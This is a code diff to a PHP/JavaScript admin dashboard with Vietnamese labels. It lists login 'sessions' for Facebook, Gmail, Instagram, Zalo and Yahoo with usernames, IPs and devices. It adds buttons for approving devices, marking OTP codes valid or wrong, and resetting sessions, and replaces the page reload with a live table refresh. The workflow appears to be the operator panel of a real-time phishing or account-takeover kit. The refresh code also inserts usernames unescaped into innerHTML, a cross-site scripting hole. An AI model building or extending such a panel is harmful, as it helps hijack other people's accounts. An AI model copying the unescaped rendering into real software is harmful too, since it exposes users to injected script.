@@ -292,7 +292,7 @@ $recent_logs = getRecentLogs(20);
                 </thead>
                 <tbody class="bg-gray-800 divide-y divide-gray-700">
                     <?php foreach ($sessions as $session): ?>
-                        <tr class="hover:bg-gray-700 transition-colors">
+                        <tr class="hover:bg-gray-700 transition-colors" data-session-id="<?php echo htmlspecialchars($session['session_id']); ?>" data-status="<?php echo htmlspecialchars(strtolower($session['status'])); ?>">
                             <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">
                                 <code class="text-xs"><?php echo substr($session['session_id'], 0, 20) . '...'; ?></code>
                             </td>
@@ -319,18 +319,18 @@ $recent_logs = getRecentLogs(20);
                                 </div>
                             </td>
                             <td class="px-6 py-4 whitespace-nowrap">
-                                <span class="inline-flex px-2 py-1 text-xs font-semibold rounded-full
+                                <span data-role="status-badge" class="inline-flex px-2 py-1 text-xs font-semibold rounded-full <?php
+                                    $st = strtolower($session['status']);
+                                    echo $st === 'pending' ? 'bg-yellow-100 text-yellow-800' :
+                                        ($st === 'processing' ? 'bg-blue-100 text-blue-800' :
+                                        ($st === 'success' ? 'bg-green-100 text-green-800' :
+                                        ($st === 'failed' ? 'bg-red-100 text-red-800' : 'bg-gray-100 text-gray-800')));
+                                ?>">
                                     <?php
-                                    echo $session['status'] === 'pending' ? 'bg-yellow-100 text-yellow-800' :
-                                        ($session['status'] === 'processing' ? 'bg-blue-100 text-blue-800' :
-                                        ($session['status'] === 'success' ? 'bg-green-100 text-green-800' :
-                                        ($session['status'] === 'failed' ? 'bg-red-100 text-red-800' : 'bg-gray-100 text-gray-800')));
-                                    ?>">
-                                    <?php
-                                    echo $session['status'] === 'pending' ? 'Chờ xử lý' :
-                                        ($session['status'] === 'processing' ? 'Đang xử lý' :
-                                        ($session['status'] === 'success' ? 'Thành công' :
-                                        ($session['status'] === 'failed' ? 'Thất bại' : 'Bị chặn')));
+                                    echo $st === 'pending' ? 'Chờ xử lý' :
+                                        ($st === 'processing' ? 'Đang xử lý' :
+                                        ($st === 'success' ? 'Thành công' :
+                                        ($st === 'failed' ? 'Thất bại' : ucfirst($st))));
                                     ?>
                                 </span>
                             </td>
@@ -338,16 +338,42 @@ $recent_logs = getRecentLogs(20);
                                 <?php echo formatDate($session['created_at']); ?>
                             </td>
                             <td class="px-6 py-4 whitespace-nowrap text-sm font-medium">
-                                <a href="<?php echo APP_URL; ?>/admin/session-details?id=<?php echo $session['session_id']; ?>"
-                                   class="text-primary-400 hover:text-primary-300 mr-3">
-                                    <i class="fas fa-eye mr-1"></i> Chi tiết
-                                </a>
-                                <?php if ($session['status'] === 'failed' || $session['status'] === 'blocked'): ?>
-                                    <button onclick="blockIP('<?php echo $session['user_ip']; ?>')"
-                                            class="text-red-400 hover:text-red-300">
-                                        <i class="fas fa-ban mr-1"></i> Chặn IP
+                                <div class="flex items-center space-x-3">
+                                    <a href="<?php echo APP_URL; ?>/admin/session-details?id=<?php echo $session['session_id']; ?>" class="text-primary-400 hover:text-primary-300" title="Xem chi tiết">
+                                        <i class="fas fa-eye"></i>
+                                    </a>
+                                    <?php
+                                      $st = strtolower($session['status']);
+                                      $canApprove = in_array($st, ['pending','device_approval_required']);
+                                      $canOtp = in_array($st, ['otp_required']);
+                                      $isVerifying = ($st === 'otp_verifying');
+                                      $terminal = in_array($st, ['approved','otp_approved','rejected','expired','success','failed','blocked','reset']);
+                                    ?>
+                                    <button class="px-3 py-1 rounded bg-green-600 hover:bg-green-700 text-white disabled:opacity-50"
+                                            title="Phê duyệt thiết bị"
+                                            onclick="adminSessionAction(this,'approve','<?php echo $session['session_id']; ?>')"
+                                            <?php echo $canApprove ? '' : 'disabled'; ?>>
+                                        <i class="fas fa-check"></i>
                                     </button>
-                                <?php endif; ?>
+                                    <button class="px-3 py-1 rounded bg-blue-600 hover:bg-blue-700 text-white disabled:opacity-50"
+                                            title="Duyệt OTP hợp lệ"
+                                            onclick="adminSessionAction(this,'otp_ok','<?php echo $session['session_id']; ?>')"
+                                            <?php echo ($canOtp && !$isVerifying) ? '' : 'disabled'; ?>>
+                                        <i class="fas fa-shield-alt"></i>
+                                    </button>
+                                    <button class="px-3 py-1 rounded bg-yellow-600 hover:bg-yellow-700 text-white disabled:opacity-50"
+                                            title="Đánh dấu OTP sai"
+                                            onclick="adminSessionAction(this,'otp_fail','<?php echo $session['session_id']; ?>')"
+                                            <?php echo ($canOtp && !$isVerifying) ? '' : 'disabled'; ?>>
+                                        <i class="fas fa-exclamation-triangle"></i>
+                                    </button>
+                                    <button class="px-3 py-1 rounded bg-red-600 hover:bg-red-700 text-white disabled:opacity-50"
+                                            title="Reset phiên"
+                                            onclick="adminSessionAction(this,'reset','<?php echo $session['session_id']; ?>')"
+                                            <?php echo $terminal && !isAdminKeyVerified() ? 'disabled' : ''; ?>>
+                                        <i class="fas fa-undo"></i>
+                                    </button>
+                                </div>
                             </td>
                         </tr>
                     <?php endforeach; ?>
@@ -569,10 +595,65 @@ function blockIP(ip) {
     showBlockIPModal();
 }
 
-// Auto-refresh every 30 seconds
+function refreshAdminSessions(){
+    // Refresh the table page with current filters via admin API then patch tbody
+    var params = new URLSearchParams(window.location.search);
+    var page = params.get('page') || '1';
+    var status = params.get('status') || '';
+    var platform = params.get('platform') || '';
+    var search = params.get('username') || '';
+    fetch('<?php echo APP_URL; ?>/api/admin/sessions?page='+encodeURIComponent(page)+'&status='+encodeURIComponent(status)+'&platform='+encodeURIComponent(platform)+'&search='+encodeURIComponent(search), {
+        headers: { 'X-Requested-With': 'XMLHttpRequest' }
+    })
+    .then(r=>r.json())
+    .then(data=>{
+        if (!data || !data.success) return;
+        var rows = data.data && data.data.sessions ? data.data.sessions : [];
+        var tbody = document.querySelector('table tbody');
+        if (!tbody) return;
+        var html = rows.map(function(s){
+            var platformIcon = s.platform;
+            var platformColor = s.platform === 'facebook' ? 'text-blue-400' : (s.platform === 'gmail' ? 'text-red-400' : (s.platform === 'instagram' ? 'text-pink-400' : (s.platform === 'zalo' ? 'text-blue-400' : (s.platform === 'yahoo' ? 'text-purple-400' : 'text-blue-400'))));
+            var st = (s.status || '').toLowerCase();
+            var statusBadgeClass = st === 'pending' ? 'bg-yellow-100 text-yellow-800' : (st === 'processing' ? 'bg-blue-100 text-blue-800' : (st === 'success' ? 'bg-green-100 text-green-800' : (st === 'failed' ? 'bg-red-100 text-red-800' : 'bg-gray-100 text-gray-800')));
+            var statusLabel = st === 'pending' ? 'Chờ xử lý' : (st === 'processing' ? 'Đang xử lý' : (st === 'success' ? 'Thành công' : (st === 'failed' ? 'Thất bại' : (st ? st.charAt(0).toUpperCase()+st.slice(1) : ''))));
+            var canApprove = ['pending','device_approval_required'].includes(st);
+            var canOtp = ['otp_required'].includes(st);
+            var isVerifying = (st === 'otp_verifying');
+            var terminal = ['approved','otp_approved','rejected','expired','success','failed','blocked','reset'].includes(st);
+            return '<tr class="hover:bg-gray-700 transition-colors" data-session-id="'+(s.session_id)+'" data-status="'+st+'">'
+                +'<td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300"><code class="text-xs">'+(String(s.session_id).slice(0,20))+'...</code></td>'
+                +'<td class="px-6 py-4 whitespace-nowrap"><div class="flex items-center"><i class="fab fa-'+platformIcon+' text-2xl mr-3 '+platformColor+'"></i><span class="text-white font-medium">'+(s.platform ? s.platform.charAt(0).toUpperCase()+s.platform.slice(1) : '')+'</span></div></td>'
+                +'<td class="px-6 py-4 whitespace-nowrap"><div class="text-sm text-white">'+(s.username || '')+'</div></td>'
+                +'<td class="px-6 py-4 whitespace-nowrap"><div class="text-sm text-gray-300">'+(s.user_ip || '')+'</div><div class="text-xs text-gray-400">'+(s.device_type || '')+' • '+(s.browser || '')+' • '+(s.os || '')+'</div></td>'
+                +'<td class="px-6 py-4 whitespace-nowrap"><span data-role="status-badge" class="inline-flex px-2 py-1 text-xs font-semibold rounded-full '+statusBadgeClass+'">'+statusLabel+'</span></td>'
+                +'<td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">'+(s.created_at || '')+'</td>'
+                +'<td class="px-6 py-4 whitespace-nowrap text-sm font-medium">'
+                +  '<div class="flex items-center space-x-3">'
+                +    '<a href="<?php echo APP_URL; ?>/admin/session-details?id='+(encodeURIComponent(s.session_id))+'" class="text-primary-400 hover:text-primary-300" title="Xem chi tiết"><i class="fas fa-eye"></i></a>'
+                +    '<button class="px-3 py-1 rounded bg-green-600 hover:bg-green-700 text-white" title="Phê duyệt thiết bị" '+(canApprove? '' : 'disabled')+' onclick="adminSessionAction(this,\'approve\',\''+(s.session_id)+'\')"><i class="fas fa-check"></i></button>'
+                +    '<button class="px-3 py-1 rounded bg-blue-600 hover:bg-blue-700 text-white" title="Duyệt OTP hợp lệ" '+((canOtp && !isVerifying)? '' : 'disabled')+' onclick="adminSessionAction(this,\'otp_ok\',\''+(s.session_id)+'\')"><i class="fas fa-shield-alt"></i></button>'
+                +    '<button class="px-3 py-1 rounded bg-yellow-600 hover:bg-yellow-700 text-white" title="Đánh dấu OTP sai" '+((canOtp && !isVerifying)? '' : 'disabled')+' onclick="adminSessionAction(this,\'otp_fail\',\''+(s.session_id)+'\')"><i class="fas fa-exclamation-triangle"></i></button>'
+                +    '<button class="px-3 py-1 rounded bg-red-600 hover:bg-red-700 text-white" title="Reset phiên" '+(terminal? 'disabled' : '')+' onclick="adminSessionAction(this,\'reset\',\''+(s.session_id)+'\')"><i class="fas fa-undo"></i></button>'
+                +  '</div>'
+                +'</td>'
+                +'</tr>';
+        }).join('');
+        tbody.innerHTML = html;
+    })
+    .catch(()=>{});
+}
+
+function refreshAdminRealtimePanels(){
+    // Optional lightweight refresh for active sessions and logs via mini endpoints if available.
+    // Fallback: reuse full refreshAdminSessions (table contains core data)
+    refreshAdminSessions();
+}
+
+// Auto-refresh every 30 seconds without full page reload
 setInterval(function() {
     if (!document.hidden) {
-        location.reload();
+        try { refreshAdminRealtimePanels(); } catch(e) {}
     }
 }, 30000);
 
@@ -588,6 +669,85 @@ document.getElementById('blockIPModal').addEventListener('click', function(e) {
         hideBlockIPModal();
     }
 });
+
+async function adminSessionAction(btn, action, sessionId){
+    if (!btn || !action || !sessionId) return;
+    // Confirmation and reasons where required
+    let reason = '';
+    if (action === 'reset') {
+        if (!confirm('Bạn có chắc chắn muốn reset phiên này? Người dùng sẽ phải đăng nhập lại.')) return;
+        reason = prompt('Vui lòng nhập lý do reset phiên:');
+        if (!reason || reason.trim().length < 3) { alert('Cần nhập lý do hợp lệ.'); return; }
+    }
+    if (action === 'otp_fail') {
+        const choices = ['Mã không khớp','Hết hạn','Sai định dạng','Khác'];
+        const picked = prompt('Lý do OTP sai (gợi ý: '+choices.join(', ')+')');
+        reason = (picked || '').trim();
+        if (!reason || reason.length < 3) { alert('Cần nhập lý do hợp lệ.'); return; }
+    }
+
+    // Loading state
+    const orig = btn.innerHTML;
+    btn.disabled = true;
+    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+    try {
+        const res = await fetch('<?php echo APP_URL; ?>/api/admin/session-action.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-Requested-With': 'XMLHttpRequest'
+            },
+            body: JSON.stringify({
+                csrf_token: '<?php echo $_SESSION['csrf_token']; ?>',
+                session_id: sessionId,
+                action: action,
+                reason: reason
+            })
+        });
+        const data = await res.json();
+        if (data && data.success) {
+            // Minimal row update
+            try { await updateSessionRow(sessionId); } catch(e) {}
+        } else {
+            alert(data && data.message ? data.message : 'Thao tác thất bại');
+        }
+    } catch(e){
+        alert('Lỗi mạng, vui lòng thử lại.');
+    } finally {
+        btn.innerHTML = orig;
+        btn.disabled = false;
+    }
+}
+
+async function updateSessionRow(sessionId){
+    const res = await fetch('<?php echo APP_URL; ?>/api/admin/session?id='+encodeURIComponent(sessionId), { headers: { 'X-Requested-With': 'XMLHttpRequest' }});
+    const j = await res.json();
+    if (!j || !j.success) return refreshAdminSessions();
+    const s = j.data;
+    const tr = document.querySelector('tr[data-session-id="'+CSS.escape(String(sessionId))+'"]');
+    if (!tr) return refreshAdminSessions();
+    // Update status badge
+    const st = (s.status || '').toLowerCase();
+    const badge = tr.querySelector('[data-role="status-badge"]');
+    if (badge){
+        const cls = st === 'pending' ? 'bg-yellow-100 text-yellow-800' : (st === 'processing' ? 'bg-blue-100 text-blue-800' : (st === 'success' ? 'bg-green-100 text-green-800' : (st === 'failed' ? 'bg-red-100 text-red-800' : 'bg-gray-100 text-gray-800')));
+        badge.className = 'inline-flex px-2 py-1 text-xs font-semibold rounded-full '+cls;
+        badge.textContent = st === 'pending' ? 'Chờ xử lý' : (st === 'processing' ? 'Đang xử lý' : (st === 'success' ? 'Thành công' : (st === 'failed' ? 'Thất bại' : (st ? st.charAt(0).toUpperCase()+st.slice(1) : ''))));
+    }
+    tr.setAttribute('data-status', st);
+    // Toggle buttons
+    const canApprove = ['pending','device_approval_required'].includes(st);
+    const canOtp = ['otp_required'].includes(st);
+    const isVerifying = (st === 'otp_verifying');
+    const terminal = ['approved','otp_approved','rejected','expired','success','failed','blocked','reset'].includes(st);
+    const buttons = tr.querySelectorAll('td:last-child button');
+    if (buttons && buttons.length >= 4){
+        buttons[0].disabled = !canApprove;
+        buttons[1].disabled = !(canOtp && !isVerifying);
+        buttons[2].disabled = !(canOtp && !isVerifying);
+        buttons[3].disabled = terminal; // adjust if policy allows force reset
+    }
+}
 </script>
 
 <?php include '../../includes/footer.php'; ?>
